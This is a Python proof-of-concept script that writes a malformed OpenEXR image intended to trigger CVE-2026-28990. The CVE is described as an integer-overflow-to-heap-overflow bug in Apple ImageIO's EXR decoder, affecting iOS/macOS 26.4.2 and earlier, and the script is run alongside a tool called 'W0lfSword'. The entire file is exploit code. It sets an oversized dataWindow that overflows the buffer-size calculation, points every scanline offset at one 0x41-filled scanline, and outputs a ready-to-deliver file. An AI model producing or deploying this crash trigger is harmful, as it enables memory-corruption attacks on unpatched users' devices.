#!/usr/bin/env python3
"""
gen_exr_trigger.py — generate a crafted EXR that triggers CVE-2026-28990
(ImageIO EXRReadPlugin::decodeBlockAppleEXR integer overflow → heap overflow).

Stdlib-only port of:
  referenceforAI/moreprojects/exr-imageio-poc/gen_exr_trigger.py
(original imported numpy but never used it; this version has zero deps).

Alive on iOS/macOS <= 26.4.2 (patched in 26.5). Use with `./W0lfSword poc exr`.

Usage: gen_exr_trigger.py <out.exr> [width] [height]
"""

import struct
import sys

EXR_MAGIC = 0x01312F76


def write_string(data, s):
    data.extend(s.encode() if isinstance(s, str) else s)
    data.extend(b"\x00")


def write_attr(data, name, type_name, value_bytes):
    write_string(data, name)
    write_string(data, type_name)
    data.extend(struct.pack("<I", len(value_bytes)))
    data.extend(value_bytes)


def write_box2i(xmin, ymin, xmax, ymax):
    return struct.pack("<iiii", xmin, ymin, xmax, ymax)


def write_v2f(x, y):
    return struct.pack("<ff", x, y)


def write_chlist_extended(channels):
    """channels: list of (name, pixel_type, x_sampling, y_sampling)."""
    data = bytearray()
    for name, pixel_type, x_sampling, y_sampling in channels:
        write_string(data, name)
        data.extend(struct.pack("<I", pixel_type))
        data.extend(struct.pack("<B", 0))            # pLinear
        data.extend(b"\x00\x00\x00")                 # reserved
        data.extend(struct.pack("<ii", x_sampling, y_sampling))
    data.extend(b"\x00")                             # chlist terminator
    return bytes(data)


def generate_exr_overflow_trigger(filename, width, height):
    num_channels = 4

    header = bytearray()
    header.extend(struct.pack("<I", EXR_MAGIC))
    header.extend(struct.pack("<I", 2))

    chlist = write_chlist_extended([
        ("A", 2, 1, 1),
        ("B", 2, 1, 1),
        ("G", 2, 1, 1),
        ("R", 2, 1, 1),
    ])
    write_attr(header, "channels", "chlist", chlist)
    write_attr(header, "compression", "compression", struct.pack("<B", 0))

    # The buggy size calculation uses dataWindow (NOT displayWindow).
    write_attr(header, "dataWindow", "box2i",
               write_box2i(0, 0, width - 1, height - 1))

    # Not used in the size calc — keep small.
    write_attr(header, "displayWindow", "box2i",
               write_box2i(0, 0, 100 - 1, 100 - 1))

    write_attr(header, "lineOrder", "lineOrder", struct.pack("<B", 0))
    write_attr(header, "pixelAspectRatio", "float", struct.pack("<f", 1.0))
    write_attr(header, "screenWindowCenter", "v2f", write_v2f(0.0, 0.0))
    write_attr(header, "screenWindowWidth", "float", struct.pack("<f", 1.0))
    header.extend(b"\x00")

    scanline_size = width * num_channels * 4  # one scanline

    offsets = bytearray()
    pixel_data_start = len(header) + height * 8
    for _ in range(height):
        # All scanline offsets point at the same single legit scanline.
        offsets.extend(struct.pack("<Q", pixel_data_start))

    # one legit scanline
    pixel_data = bytearray()
    pixel_data.extend(struct.pack("<i", 0))              # y = 0
    pixel_data.extend(struct.pack("<I", scanline_size))  # data size
    pixel_data.extend(b"\x41" * scanline_size)           # 0x41414141 fill

    with open(filename, "wb") as f:
        f.write(header)
        f.write(offsets)
        f.write(pixel_data)

    print(f"[+] wrote {filename} (dataWindow {width}x{height}, "
          f"{scanline_size} B/scanline, {len(pixel_data)} B payload)")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    w = int(sys.argv[2]) if len(sys.argv) > 2 else 16384
    h = int(sys.argv[3]) if len(sys.argv) > 3 else 65536
    generate_exr_overflow_trigger(sys.argv[1], w, h)
